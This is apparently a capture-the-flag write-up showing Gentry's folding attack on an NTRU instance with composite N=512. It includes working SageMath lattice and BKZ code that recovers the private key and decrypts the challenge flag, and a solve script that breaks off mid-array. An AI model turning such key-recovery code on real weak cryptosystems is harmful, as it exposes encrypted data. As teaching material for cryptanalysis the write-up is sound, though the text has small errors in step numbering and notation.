<p>The security in NTRU comes from the difficulty of finding a very short vector in the associated NTRU lattice. Key generation in NTRU works by picking two small ternary polynomials, $f$ and $g$ (ternary meaning coefficients in ${-1,0,1}$). We publish the public key $h$:</p>

\[\large h = p \cdot f_{q}^{-1}\cdot g \mod q\]

<p>Here, $f$ and $g$ make up the private key. Encryption in NTRUEncrypt works as follows:</p>

\[\large ct = h \cdot r + m \mod q\]

<p>$h$ is the public key, $m$ is the plaintext message, and $r$ is a small randomly generated polynomial, most often ternary too. $r$ must remain secret! We may also choose to include the factor $p$ in the ciphertext $ct$ instead of the public key $h$. 
Decryption in NTRUEncrypt works as follows:</p>

\[\large a = f \cdot e \mod q\]

<p>and the coefficients are recentered to $\left( -{q}/{2}, \;{q}/{2} \right)$. Then, we do:</p>

\[\large m = f_{p}^{-1} \cdot a \mod p\]

<p>which recovers the original plaintext message $m$.. If $N$ is very small, it may be possible to retrieve $f$ and $g$ trivially using the <code class="language-plaintext highlighter-rouge">NTRU lattice</code>:</p>

\[\large B = 
\begin{pmatrix}
qI_{N} &amp; 0 \\
H &amp; I_{N}
\end{pmatrix}\]

<p>Where $H$ is the $N \times N$ circulant convolution matrix of the public key $h$. Running LLL on this gives $g$ and $f$ (or $-g$ and $-f$) in the first row.</p>

<h5 id="gentrys-folding-attack">Gentry’s folding attack</h5>

<p>If $N$ is composite, there is a natural “folding” ring homomorphism:</p>

\[\large \theta_{d}: \mathbb{Z}_{q}[x]/(x^{N}-1) \quad \rightarrow \quad \mathbb{Z}_{q}[x]/(x^{d}-1)\]

<p>Since $x^{d}-1$ divides $x^{N}-1$ whenever $d$ divides $N$. Being a ring map, it preserves the convolution $f^{(d)} * h^{(d)} = g^{(d)} \bmod q$. This lets us replace the $2N$-dimensional NTRU lattice with a smaller $2d$-dimensional lattice which contains a shorter “folded” key $(f^{(d)}, g^{(d)})$.</p>

<p>It turns out that the folding gives us the linear relations:</p>

\[\large \begin{align}
\nonumber f^{(d)}_{i} &amp;= f_{i} + f_{i+d} \\
\nonumber f_{i+d} &amp;= f^{(d)}_{i} - f_{i}
\end{align}\]

<p>Which means that the second half of $f$ is determined by $f^{(d)}$ and the first half of $f$. This relation is the key for the attack. With the relations, we can build the following modified NTRU lattice:</p>

\[\large M = \begin{bmatrix}
0 &amp; t \\
I_{d} &amp; H_{i}-H_{i+d} \\
0 &amp; qI_{N}
\end{bmatrix}\]

<p>With $N=512$, the attack is comprised of four steps:</p>

<ul>
  <li>Step 1: $d=64$ to get $(f^{(64)},g^{(64)})$</li>
  <li>Step 2: $d=128$ to get $(f^{(128)},g^{(128)})$ and linear relations linking the two quarters of $f$</li>
  <li>Step 2: $d=256$ to get $(f^{(256)},g^{(256)})$ and linear relations linking the two halves of $f$</li>
  <li>Step 4: $d=512$, use the relations to build a $(2N+1) \times (2N)$ lattice with target $(u,v)$ corresponding to the first $d$ coefficients of $(f,g)$. Since $d=N$ in this step, we completely recover $(f,g)$.</li>
</ul>

<h5 id="attack-implementation">Attack implementation</h5>

<p>We are given the public key $h$. Step 1 of the attack can be done by just solving the normal NTRU lattice with BKZ on</p>

\[\large \mathbb{Z}_{q}[x]/(x^{64}-1)\]

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">prev</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Searching for fold..."</span><span class="p">)</span>
    <span class="n">H</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">.</span><span class="n">circulant</span><span class="p">([</span><span class="n">hh</span><span class="p">.</span><span class="n">lift_centered</span><span class="p">()</span> <span class="k">for</span> <span class="n">hh</span> <span class="ow">in</span> <span class="n">h</span><span class="p">.</span><span class="n">lift</span><span class="p">()</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)])</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">prev</span><span class="p">:</span> <span class="c1"># normal NTRULattice
</span>        <span class="k">return</span> <span class="n">block_matrix</span><span class="p">([</span>
            <span class="p">[</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">H</span><span class="p">],</span>
            <span class="p">[</span><span class="n">zero_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">q</span><span class="o">*</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">)]</span>
        <span class="p">])</span>
    <span class="p">[...]</span>

<span class="n">L3</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">8</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
</code></pre></div></div>

<p>The resulting basis is then scanned for the folded secret $f^{(d)}$:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">enum_basis</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">prev</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">L</span><span class="p">.</span><span class="n">nrows</span><span class="p">()):</span>
        <span class="n">v</span> <span class="o">=</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][:</span><span class="n">L</span><span class="p">.</span><span class="n">ncols</span><span class="p">()</span><span class="o">//</span><span class="mi">2</span><span class="p">]</span>              
        <span class="k">if</span> <span class="nb">max</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span> <span class="n">v</span> <span class="o">=</span> <span class="o">-</span><span class="n">v</span>
        <span class="k">if</span> <span class="nb">min</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>  
            <span class="n">c</span> <span class="o">=</span> <span class="n">v</span> <span class="k">if</span> <span class="n">prev</span> <span class="ow">is</span> <span class="bp">None</span> <span class="k">else</span> <span class="n">v</span><span class="p">.</span><span class="n">concatenate</span><span class="p">(</span><span class="n">prev</span> <span class="o">-</span> <span class="n">v</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">norm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">df</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">c</span>
    <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"No candidate found"</span><span class="p">)</span>

<span class="p">[...]</span>
<span class="n">f3</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L3</span><span class="p">)</span>
</code></pre></div></div>

<p>Subsequent steps are then solved and enumerated using the relations $f_{i+d} = f_{i}^{(d)} - f_{i}$:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">prev</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Searching for fold..."</span><span class="p">)</span>
    <span class="n">H</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">.</span><span class="n">circulant</span><span class="p">([</span><span class="n">hh</span><span class="p">.</span><span class="n">lift_centered</span><span class="p">()</span> <span class="k">for</span> <span class="n">hh</span> <span class="ow">in</span> <span class="n">h</span><span class="p">.</span><span class="n">lift</span><span class="p">()</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)])</span>

	<span class="p">[...]</span>

    <span class="n">I</span> <span class="o">=</span> <span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">prev</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span> <span class="o">*</span> <span class="n">H</span>
    <span class="n">L_ug</span> <span class="o">=</span> <span class="n">block_matrix</span><span class="p">([</span>
        <span class="p">[</span><span class="n">I</span><span class="p">,</span> <span class="n">I</span><span class="p">.</span><span class="n">augment</span><span class="p">(</span><span class="o">-</span><span class="n">I</span><span class="p">)</span> <span class="o">*</span> <span class="n">H</span><span class="p">],</span>
        <span class="p">[</span><span class="n">zero_matrix</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">),</span> <span class="n">t</span><span class="p">.</span><span class="n">row</span><span class="p">()],</span>
        <span class="p">[</span><span class="n">zero_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">),</span> <span class="n">q</span><span class="o">*</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">)]</span>
    <span class="p">])</span>
    <span class="k">return</span> <span class="n">L_ug</span><span class="p">[:</span><span class="n">d</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="p">:</span><span class="n">d</span><span class="p">]</span>

<span class="p">[...]</span>
<span class="n">L2</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">4</span><span class="p">,</span> <span class="n">f3</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f3</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
<span class="n">f2</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L2</span><span class="p">,</span> <span class="n">f3</span><span class="p">)</span>
</code></pre></div></div>

<p>The same is repeated until the entire key $f$ is recovered:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
    <span class="n">L3</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">8</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f3</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L3</span><span class="p">)</span>

    <span class="n">L2</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">4</span><span class="p">,</span> <span class="n">f3</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f3</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f2</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L2</span><span class="p">,</span> <span class="n">f3</span><span class="p">)</span>

    <span class="n">L1</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">f2</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f2</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f1</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L1</span><span class="p">,</span> <span class="n">f2</span><span class="p">)</span>

    <span class="n">L0</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">f1</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f1</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f0</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L0</span><span class="p">,</span> <span class="n">f1</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">R</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">f0</span><span class="p">))</span>
</code></pre></div></div>

<p>For <code class="language-plaintext highlighter-rouge">L2, L1, L0</code>, we delete the rows that correspond to already known zero-positions in $f^{(d)}$, which shrinks the lattice and makes BKZ easier. This is because when $f_{i}^{(d)} = 0$, we know $f_{i}  = f_{i+d} = 0$ since $f_{i} \in [0, 1]$. This is also mentioned in the paper.</p>

<p>Finally, we recover the key $f$ and the ciphertext can be trivially decrypted:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">c</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">*</span> <span class="n">Rqn</span><span class="p">(</span><span class="n">f</span><span class="p">)).</span><span class="n">lift</span><span class="p">()</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">Rpn</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">/</span><span class="n">Rpn</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">R</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">lift</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">poly</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">sum</span><span class="p">((</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">poly</span><span class="p">.</span><span class="nb">list</span><span class="p">()))</span>

<span class="n">sk</span> <span class="o">=</span> <span class="n">attack</span><span class="p">(</span><span class="n">Rqn</span><span class="p">(</span><span class="n">pk</span><span class="p">))</span>
<span class="n">d</span>  <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">Rqn</span><span class="p">(</span><span class="n">ct</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">decode</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s">').decode()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="c1"># NNS{k33p_f0ld1ng_4nd_f0ld1ng_l1k3_4n_0r1g4m1_m4st3r}
</span></code></pre></div></div>

<p>Which gives us our flag <code class="language-plaintext highlighter-rouge">NNS{k33p_f0ld1ng_4nd_f0ld1ng_l1k3_4n_0r1g4m1_m4st3r}</code>.</p>

<p>Some implementation aspects are borrowed from https://qiita.com/xagawa/items/0f97641e9c3ef0633f1f, some credit is due</p>

<h5 id="solve-script">Solve script</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="n">df</span><span class="p">,</span> <span class="n">dg</span><span class="p">,</span> <span class="n">dr</span> <span class="o">=</span> <span class="p">[</span><span class="mi">512</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">22</span><span class="p">]</span>
<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span>  <span class="o">=</span> <span class="n">ZZ</span><span class="p">[]</span>
<span class="n">Rq</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Integers</span><span class="p">(</span><span class="n">q</span><span class="p">)[]</span>
<span class="n">Rqn</span> <span class="o">=</span> <span class="n">Rq</span><span class="p">.</span><span class="n">quotient</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">Rp</span><span class="p">.</span><span class="o">&lt;</span><span class="n">w</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">Integers</span><span class="p">(</span><span class="n">p</span><span class="p">)[]</span>
<span class="n">Rpn</span> <span class="o">=</span> <span class="n">Rp</span><span class="p">.</span><span class="n">quotient</span><span class="p">(</span><span class="n">w</span><span class="o">^</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="n">c</span><span class="p">):</span>
    <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">*</span> <span class="n">Rqn</span><span class="p">(</span><span class="n">f</span><span class="p">)).</span><span class="n">lift</span><span class="p">()</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">Rpn</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="o">/</span><span class="n">Rpn</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">R</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">lift</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">poly</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">sum</span><span class="p">((</span><span class="n">c</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">poly</span><span class="p">.</span><span class="nb">list</span><span class="p">()))</span>

<span class="c1"># Gentry's folding attack
</span><span class="k">def</span> <span class="nf">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">prev</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Searching for fold..."</span><span class="p">)</span>
    <span class="n">H</span> <span class="o">=</span> <span class="n">matrix</span><span class="p">.</span><span class="n">circulant</span><span class="p">([</span><span class="n">hh</span><span class="p">.</span><span class="n">lift_centered</span><span class="p">()</span> <span class="k">for</span> <span class="n">hh</span> <span class="ow">in</span> <span class="n">h</span><span class="p">.</span><span class="n">lift</span><span class="p">()</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)])</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="n">prev</span><span class="p">:</span> <span class="c1"># normal NTRULattice
</span>        <span class="k">return</span> <span class="n">block_matrix</span><span class="p">([</span>
            <span class="p">[</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">H</span><span class="p">],</span>
            <span class="p">[</span><span class="n">zero_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">),</span> <span class="n">q</span><span class="o">*</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">)]</span>
        <span class="p">])</span>

    <span class="n">I</span> <span class="o">=</span> <span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">vector</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">prev</span><span class="p">)</span> <span class="o">+</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="p">(</span><span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">))</span> <span class="o">*</span> <span class="n">H</span>
    <span class="n">L_ug</span> <span class="o">=</span> <span class="n">block_matrix</span><span class="p">([</span>
        <span class="p">[</span><span class="n">I</span><span class="p">,</span> <span class="n">I</span><span class="p">.</span><span class="n">augment</span><span class="p">(</span><span class="o">-</span><span class="n">I</span><span class="p">)</span> <span class="o">*</span> <span class="n">H</span><span class="p">],</span>
        <span class="p">[</span><span class="n">zero_matrix</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">),</span> <span class="n">t</span><span class="p">.</span><span class="n">row</span><span class="p">()],</span>
        <span class="p">[</span><span class="n">zero_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">d</span><span class="o">//</span><span class="mi">2</span><span class="p">),</span> <span class="n">q</span><span class="o">*</span><span class="n">identity_matrix</span><span class="p">(</span><span class="n">d</span><span class="p">)]</span>
    <span class="p">])</span>
    <span class="k">return</span> <span class="n">L_ug</span><span class="p">[:</span><span class="n">d</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="p">:</span><span class="n">d</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">enum_basis</span><span class="p">(</span><span class="n">L</span><span class="p">,</span> <span class="n">prev</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">L</span><span class="p">.</span><span class="n">nrows</span><span class="p">()):</span>
        <span class="n">v</span> <span class="o">=</span> <span class="n">L</span><span class="p">[</span><span class="n">i</span><span class="p">][:</span><span class="n">L</span><span class="p">.</span><span class="n">ncols</span><span class="p">()</span><span class="o">//</span><span class="mi">2</span><span class="p">]</span>              
        <span class="k">if</span> <span class="nb">max</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span> <span class="n">v</span> <span class="o">=</span> <span class="o">-</span><span class="n">v</span>
        <span class="k">if</span> <span class="nb">min</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">:</span>  
            <span class="n">c</span> <span class="o">=</span> <span class="n">v</span> <span class="k">if</span> <span class="n">prev</span> <span class="ow">is</span> <span class="bp">None</span> <span class="k">else</span> <span class="n">v</span><span class="p">.</span><span class="n">concatenate</span><span class="p">(</span><span class="n">prev</span> <span class="o">-</span> <span class="n">v</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">norm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="n">df</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">c</span>
    <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"No candidate found"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
    <span class="n">L3</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">8</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f3</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L3</span><span class="p">)</span>

    <span class="n">L2</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">4</span><span class="p">,</span> <span class="n">f3</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f3</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f2</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L2</span><span class="p">,</span> <span class="n">f3</span><span class="p">)</span>

    <span class="n">L1</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="o">//</span><span class="mi">2</span><span class="p">,</span> <span class="n">f2</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f2</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f1</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L1</span><span class="p">,</span> <span class="n">f2</span><span class="p">)</span>

    <span class="n">L0</span> <span class="o">=</span> <span class="n">fold_basis</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">n</span><span class="p">,</span> <span class="n">f1</span><span class="p">).</span><span class="n">delete_rows</span><span class="p">(</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f1</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">==</span><span class="mi">0</span><span class="p">).</span><span class="n">BKZ</span><span class="p">()</span>
    <span class="n">f0</span> <span class="o">=</span> <span class="n">enum_basis</span><span class="p">(</span><span class="n">L0</span><span class="p">,</span> <span class="n">f1</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">R</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">f0</span><span class="p">))</span>

<span class="n">pk</span> <span class="o">=</span> <span class="p">[</span><span class="mi">24</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">35</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">60</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> 